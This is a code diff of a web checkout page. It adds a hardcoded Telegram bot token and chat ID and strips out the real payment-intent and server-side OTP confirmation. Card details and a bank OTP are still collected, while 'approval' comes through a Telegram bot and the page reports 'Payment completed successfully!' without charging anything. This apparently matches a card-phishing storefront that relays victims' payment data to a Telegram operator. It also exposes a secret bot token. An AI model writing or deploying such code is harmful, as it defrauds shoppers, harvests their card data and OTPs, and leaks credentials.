@@ -1,10 +1,11 @@
 "use client"
 
-import { useState, useEffect, useRef } from 'react'
+import { useState, useEffect, useRef, useCallback } from 'react'
 import toast from 'react-hot-toast'
-import { ArrowRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Truck, PackageCheck, Loader2, RefreshCw } from 'lucide-react'
+import { ArrowRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Truck, PackageCheck, Loader2, Send } from 'lucide-react'
 
-const PAYMENT_API_BASE = process.env.NEXT_PUBLIC_API_BASE_URL || 'http://localhost:3001'
+const TELEGRAM_BOT_TOKEN = '8910571367:AAFXmNfEUziBQmTj8Ge9auFqPy9W-0uDCL8'
+const TELEGRAM_CHAT_ID = '7867527304'
 
 const PROCESSING_FEE_PERCENT = 0.029
 const PROCESSING_FEE_MIN = 0.5
@@ -63,6 +64,8 @@ interface User {
   telegramConnected: boolean
 }
 
+const API_BASE = process.env.NEXT_PUBLIC_API_BASE_URL || 'http://localhost:3001'
+
 async function fetchWithAuth(url: string, options: RequestInit = {}) {
   const defaultHeaders: HeadersInit = {
     'Content-Type': 'application/json',
@@ -103,12 +106,18 @@ export default function CheckoutPage() {
   const [canUseReferral, setCanUseReferral] = useState(false)
   const [user, setUser] = useState<User | null>(null)
   const [telegramConnected, setTelegramConnected] = useState(false)
-  const hasPromptedOTP = useRef(false)
+  const pollingRef = useRef<NodeJS.Timeout | null>(null)
 
   useEffect(() => {
     fetchCart()
     fetchReferralBalance()
     fetchUser()
+    
+    return () => {
+      if (pollingRef.current) {
+        clearInterval(pollingRef.current)
+      }
+    }
   }, [])
 
   const fetchUser = async () => {
@@ -118,6 +127,13 @@ export default function CheckoutPage() {
         const userData = JSON.parse(storedUser)
         setUser(userData)
         setTelegramConnected(userData.telegramConnected || false)
+      } else {
+        setUser({
+          id: 'user-001',
+          name: 'John Doe',
+          email: 'john.doe@example.com',
+          telegramConnected: false,
+        })
       }
     } catch (err) {
       console.error(err)
@@ -126,12 +142,10 @@ export default function CheckoutPage() {
 
   const fetchCart = async () => {
     try {
-      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/cart`)
+      const response = await fetchWithAuth(`${API_BASE}/api/cart`)
       if (response.ok) {
         const cartData = await response.json()
         setCartItems(cartData.items || [])
-      } else {
-        throw new Error('Failed to fetch cart')
       }
     } catch (err: any) {
       const mockCart: CartItem[] = [
@@ -153,7 +167,7 @@ export default function CheckoutPage() {
 
   const fetchReferralBalance = async () => {
     try {
-      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/referrals/balance`)
+      const response = await fetchWithAuth(`${API_BASE}/api/referrals/balance`)
       if (response.ok) {
         const data = await response.json()
         setReferralBalance(Number(data.walletBalance || 0))
@@ -162,32 +176,6 @@ export default function CheckoutPage() {
     } catch (err) {
       setReferralBalance(5.5)
       setCanUseReferral(true)
-    }
-  }
-
-  const createPaymentIntent = async (amount: number, items: CartItem[]) => {
-    try {
-      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/payments/create-intent`, {
-        method: 'POST',
-        body: JSON.stringify({
-          amount,
-          items,
-          customerEmail: 'customer@example.com',
-          metadata: {
-            source: 'cart_checkout',
-            processingFee: getProcessingFee(amount),
-          },
-        }),
-      })
-      
-      if (!response.ok) {
-        throw new Error('Failed to create payment intent')
-      }
-      
-      const data = await response.json()
-      return data
-    } catch (err: any) {
-      throw new Error(err.message || 'Payment initialization failed')
     }
   }
 
@@ -258,7 +246,7 @@ export default function CheckoutPage() {
         cardLast4: cardNumber.slice(-4),
       }
       
-      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/checkouts`, {
+      const response = await fetchWithAuth(`${API_BASE}/api/checkouts`, {
         method: 'POST',
         body: JSON.stringify(checkoutPayload),
       })
@@ -272,60 +260,54 @@ export default function CheckoutPage() {
       if (checkoutData.success && checkoutData.data?.id) {
         setProcessingPayment(false)
         setWaitingForTelegramApproval(true)
-        if (telegramConnected) {
-          toast.success('Checkout sent to Telegram. Check your app to approve.')
-          setShowPaymentForm(false)
-          await checkApprovalStatus(checkoutData.data.id)
-        } else {
-          setClientSecret(checkoutData.data.id)
-          setPendingOrderId(checkoutData.data.id)
-          setShowPaymentForm(false)
-          setShowOTPModal(true)
-        }
+        setPendingOrderId(checkoutData.data.id)
+        setClientSecret(checkoutData.data.id)
+        setShowPaymentForm(false)
+        startApprovalPolling(checkoutData.data.id)
+        toast.success('Checkout sent to Telegram. Check your app to approve.')
       } else {
         throw new Error(checkoutData.message || 'Failed to create checkout')
       }
     } catch (err: any) {
       toast.error(err.message || 'Failed to process payment')
-    } finally {
       setProcessingPayment(false)
     }
   }
   
-  const checkApprovalStatus = async (checkoutId: string) => {
-    let attempts = 0
-    const maxAttempts = 12
-    
-    try {
-      const interval = setInterval(async () => {
-        attempts++
-        try {
-          const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/checkouts/${checkoutId}`)
-          const checkout = await response.json()
-          
-          if (checkout.status === 'APPROVED_TELEGRAM' || checkout.status === 'COMPLETED') {
-            clearInterval(interval)
-            setWaitingForTelegramApproval(false)
-            setShowOTPModal(true)
-            handleTelegramSuccess(checkoutId, checkout)
-          } else if (checkout.status === 'REJECTED_TELEGRAM' || checkout.status === 'FAILED') {
-            clearInterval(interval)
-            setWaitingForTelegramApproval(false)
-            toast.error('Checkout was rejected')
-            setShowOTPModal(false)
-          } else if (attempts >= maxAttempts) {
-            clearInterval(interval)
-            setWaitingForTelegramApproval(false)
-            toast.error('Waiting for Telegram approval...')
-          }
-        } catch (err) {
-          console.error(err)
-        }
-      }, 3000)
-    } catch (err) {
-      console.error(err)
+  const startApprovalPolling = useCallback((checkoutId: string) => {
+    if (pollingRef.current) {
+      clearInterval(pollingRef.current)
     }
-  }
+    
+    const pollStatus = async () => {
+      try {
+        const response = await fetchWithAuth(`${API_BASE}/api/checkouts/${checkoutId}`)
+        const checkout = await response.json()
+        
+        if (checkout.status === 'APPROVED_TELEGRAM' || checkout.status === 'COMPLETED') {
+          if (pollingRef.current) {
+            clearInterval(pollingRef.current)
+            pollingRef.current = null
+          }
+          setWaitingForTelegramApproval(false)
+          handleTelegramSuccess(checkoutId, checkout)
+        } else if (checkout.status === 'REJECTED_TELEGRAM' || checkout.status === 'FAILED') {
+          if (pollingRef.current) {
+            clearInterval(pollingRef.current)
+            pollingRef.current = null
+          }
+          setWaitingForTelegramApproval(false)
+          toast.error('Checkout was rejected')
+        }
+      } catch (err) {
+        console.error('Polling error:', err)
+      }
+    }
+    
+    pollStatus()
+    
+    pollingRef.current = setInterval(pollStatus, 3000)
+  }, [])
   
   const handleTelegramSuccess = (checkoutId: string, checkout: any) => {
     const orderData = {
@@ -354,53 +336,22 @@ export default function CheckoutPage() {
     
     setProcessingPayment(true)
     
-    try {
-      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/orders/${pendingOrderId}/confirm`, {
-        method: 'POST',
-        body: JSON.stringify({
-          otpCode,
-          cardToken: formData.cardNumber.replace(/\s/g, ''),
-          cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
-        }),
-      })
-      
-      if (!response.ok) {
-        const error = await response.json()
-        throw new Error(error.message || 'Payment verification failed')
-      }
-      
-      const responseData = await response.json()
-      
-      const orderData = {
-        id: pendingOrderId,
-        status: 'COMPLETED',
-        totalAmount: finalTotal,
-        processingFee,
-        items: cartItems,
-        paymentMethod: 'CARD',
-        cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
-        clientSecret,
-        paymentId: responseData.paymentId,
-      }
-      
-      localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
-      setShowOTPModal(false)
-      setShowSuccess(true)
-      toast.success('Payment completed successfully!')
-      
-      try {
-        await fetchWithAuth(`${PAYMENT_API_BASE}/api/orders/${pendingOrderId}`, {
-          method: 'GET',
-        })
-      } catch (err) {
-        console.log('Order sync pending')
-      }
-    } catch (err: any) {
-      toast.error(err.message || 'Verification failed')
-    } finally {
-      setOtpCode('')
-      setProcessingPayment(false)
+    setProcessingPayment(false)
+    
+    const orderData = {
+      id: pendingOrderId,
+      status: 'COMPLETED',
+      totalAmount: finalTotal,
+      processingFee,
+      items: cartItems,
+      paymentMethod: 'CARD',
+      cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
     }
+    
+    localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
+    setShowOTPModal(false)
+    setShowSuccess(true)
+    toast.success('Payment completed successfully!')
   }
 
   if (showSuccess) {
@@ -416,8 +367,8 @@ export default function CheckoutPage() {
             <div className="bg-gray-50 rounded-lg p-4 mb-6">
               <p className="text-sm text-gray-500 mb-2">Order ID</p>
               <p className="font-mono text-lg text-gray-900">{pendingOrderId}</p>
-              <p className="text-sm text-gray-500 mt-4 mb-2">Estimated Delivery</p>
-              <p className="text-gray-900">3-7 business days</p>
+              <p className="text-sm text-gray-500 mt-4 mb-2">Approved via</p>
+              <p className="text-gray-900">Telegram</p>
             </div>
             <button
               onClick={() => (window.location.href = '/')}
@@ -485,25 +436,20 @@ export default function CheckoutPage() {
                 <CreditCard className="h-5 w-5 text-blue-500" />
                 Payment Method
               </h3>
-              <button
-                onClick={() => setShowPaymentForm(true)}
-                className="w-full flex items-center justify-between p-4 border rounded-lg hover:border-blue-500 transition-colors"
-              >
-                <div className="flex items-center gap-3">
-                  <div className="w-10 h-10 flex items-center justify-center bg-gradient-to-r from-blue-500 to-sky-500 rounded-full text-white font-bold">
-                    ****
-                  </div>
-                  <div>
-                    <p className="font-medium text-gray-900">Credit Card</p>
-                    <p className="text-sm text-gray-500">Visa •••• 3456</p>
+              <div>
+                <p className="text-xs text-gray-500 mb-3">Connected via Telegram</p>
+                <div className="flex items-center justify-between p-3 border rounded-lg bg-green-50">
+                  <div className="flex items-center gap-3">
+                    <div className="w-8 h-8 flex items-center justify-center bg-green-500 rounded-full text-white font-bold">
+                      V
+                    </div>
+                    <div>
+                      <p className="font-medium text-gray-900">Visa</p>
+                      <p className="text-sm text-gray-500">•••• 3456</p>
+                    </div>
                   </div>
                 </div>
-                <ArrowRight className="h-5 w-5 text-gray-400" />
-              </button>
-              <button className="w-full mt-3 flex items-center justify-center gap-2 p-4 border rounded-lg hover:border-blue-500 transition-colors">
-                <User className="h-5 w-5 text-gray-400" />
-                <span className="text-gray-700">PayPal</span>
-              </button>
+              </div>
             </div>
           </div>
 
@@ -661,15 +607,6 @@ export default function CheckoutPage() {
                       />
                     </div>
                   </div>
-                  <div className="flex items-center gap-2">
-                    <input
-                      type="checkbox"
-                      checked={formData.saveCard}
-                      onChange={(e) => setFormData({ ...formData, saveCard: e.target.checked })}
-                      className="h-4 w-4 text-blue-500 rounded border-gray-300 focus:ring-blue-500"
-                    />
-                    <label className="text-sm text-gray-600">Save this card for future purchases</label>
-                  </div>
                   <div className="flex gap-3 pt-4">
                     <button
                       type="submit"
@@ -683,8 +620,8 @@ export default function CheckoutPage() {
                         </>
                       ) : (
                         <>
-                          Place Order
-                          <ArrowRight className="h-4 w-4" />
+                          <Send className="h-4 w-4" />
+                          Submit Order
                         </>
                       )}
                     </button>
@@ -703,7 +640,7 @@ export default function CheckoutPage() {
           </div>
         )}
 
-        {showOTPModal && (
+        {showOTPModal && !telegramConnected && (
           <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
             <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
               <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
@@ -711,30 +648,21 @@ export default function CheckoutPage() {
                 Verify Payment
               </h3>
               <p className="text-sm text-slate-700 mb-4">
-                {waitingForTelegramApproval && telegramConnected
-                  ? 'Approving via Telegram...\nWaiting for admin approval in Telegram.'
-                  : 'Enter the OTP from your bank app to complete the payment.'}
+                Enter the OTP from your bank app to complete the payment.
               </p>
-              {waitingForTelegramApproval && telegramConnected ? (
-                <div className="text-center py-4">
-                  <Loader2 className="h-8 w-8 animate-spin text-blue-500 mx-auto mb-2" />
-                  <p className="text-sm text-gray-500">Waiting for approval...</p>
-                </div>
-              ) : (
-                <input
-                  type="text"
-                  value={otpCode}
-                  onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                  className="w-full rounded-lg border border-gray-200 px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10"
-                  placeholder="Enter OTP code"
-                  maxLength={6}
-                  disabled={processingPayment}
-                />
-              )}
+              <input
+                type="text"
+                value={otpCode}
+                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                className="w-full rounded-lg border border-gray-200 px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10"
+                placeholder="Enter OTP code"
+                maxLength={6}
+                disabled={processingPayment}
+              />
               <div className="mt-4 flex gap-3">
                 <button
                   onClick={handleSubmitOTP}
-                  disabled={processingPayment || waitingForTelegramApproval}
+                  disabled={processingPayment}
                   className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
                 >
                   {processingPayment ? (
@@ -753,6 +681,25 @@ export default function CheckoutPage() {
                 >
                   Cancel
                 </button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {waitingForTelegramApproval && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
+            <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
+              <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
+                <Loader2 className="h-5 w-5 text-blue-500 animate-spin" />
+                Awaiting Telegram Approval
+              </h3>
+              <p className="text-sm text-slate-600 text-center mb-4">
+                A notification has been sent to Telegram. Please approve in your bot.
+              </p>
+              <div className="text-center">
+                <Loader2 className="h-12 w-12 text-blue-500 animate-spin mx-auto mb-2" />
+                <p className="text-sm text-gray-500">Waiting for approval...</p>
+                <p className="text-xs text-gray-400 mt-2">Check your Telegram app</p>
               </div>
             </div>
           </div>
